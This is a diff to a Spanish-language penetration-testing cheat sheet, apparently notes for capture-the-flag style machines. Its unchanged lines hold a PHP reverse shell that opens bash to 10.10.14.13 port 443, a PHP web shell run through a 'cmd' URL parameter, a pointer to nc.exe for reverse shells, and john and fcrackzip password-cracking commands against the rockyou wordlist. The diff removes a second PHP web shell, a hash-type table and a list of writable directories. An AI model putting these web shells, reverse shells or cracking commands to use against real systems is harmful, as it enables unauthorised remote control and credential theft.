@@ -14,10 +14,6 @@ Modo Vi en la consola
 - **/etc/shells** Podemos ver las diferentes shells que hay 
 - **/etc/ssh/sshd_config** Podemos ver las configuraciones de ssh y ver si el usuario root se puede conectar 
 
-- **/tmp** Directorio con capacidad de escritura
-- **/var/tmp** Directorio con capacidad de escritura
-- **/dev/shm** Directorio con capacidad de escritura
-
 - /usr/share/Seclists/Web-Shells/FuzzDB/**nc.exe**    Netcat nos ayuda a conseguir una ReverShell
 
 - Comando -> **watch -n 1 ls -l /bin/bash** Monitoreamos el comando /bin/bash y miramos con ls -l (l=ele)
@@ -96,16 +92,6 @@ Modo Vi en la consola
 - Comando -> **john --wordlist=</usr/share/wordlists/rockyou.txt> < HASHFILE> --format=< HASHTYPE>** Aplicamos un ataque de fuerza bruta a un archivo hash (raw-md5, sha256)
 - Comando -> **fcrackzip -p /usr/share/wordlists/rockyou.txt -b -u FILE.zip -D** Nos crackea el hash y nos proporciona la passwd (p=init-passwd-string, b=bruteforce, D=dicctionary, u=use-unzip) 
 
------
-ID	Cryptographic Hash Algorithm
-\$1$	MD5
-\$2a$	Blowfish
-\$5$	SHA-256
-\$6$	SHA-512
-\$sha1$	SHA1crypt
-\$y$	Yescrypt
-\$gy$	Gost-yescrypt
-\$7$	Scrypt
 
 ----
 Codigo PHP para que en la url nosotros podamos ejecutar diferentes comandos **/image.php?cmd=whoami**
@@ -118,8 +104,3 @@ Comando de ReverShell en PHP
 <?
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
 ?>
-
-De esta manera tambien podemos hacer una revershell mas bonita, la peticion se emite por POST (REQUEST)
-<?
-		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
-?> 
